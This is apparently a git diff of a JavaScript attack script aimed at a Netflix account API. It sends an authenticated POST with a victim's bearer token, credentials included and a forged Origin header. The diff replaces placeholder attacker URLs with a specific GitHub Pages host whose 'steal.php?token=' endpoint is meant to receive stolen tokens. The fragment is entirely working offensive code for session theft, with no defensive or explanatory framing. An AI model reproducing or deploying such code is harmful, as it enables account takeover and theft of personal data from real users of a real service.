@@ -7,14 +7,14 @@ const victimToken = 'YOUR_VICTIMS_TOKEN';
 const apiEndpoint = 'https://capi.netflix.com/gateway/v3/users/profiles/66382103/personalization/experience/selections';
 
 // Replace with your attacker's server to receive the data
-const attackerServer = 'https://YOUR_USERNAME.github.io/attacker-server/steal.php?token=';
+const attackerServer = 'https://abdullahxxmone.github.io/attacker-server-/steal.php?token=';
 
 fetch(apiEndpoint, {
     method: 'POST',
     headers: {
         'Authorization': 'Bearer ' + victimToken,
         'Content-Type': 'application/json',
-        'Origin': 'https://YOUR_USERNAME.github.io/attacker-site' // Important: Use your attacker's domain
+        'Origin': 'https://abdullahxxmone.github.io/attacker-site' // Important: Use your attacker's domain
     },
     credentials: 'include',
     body: JSON.stringify({
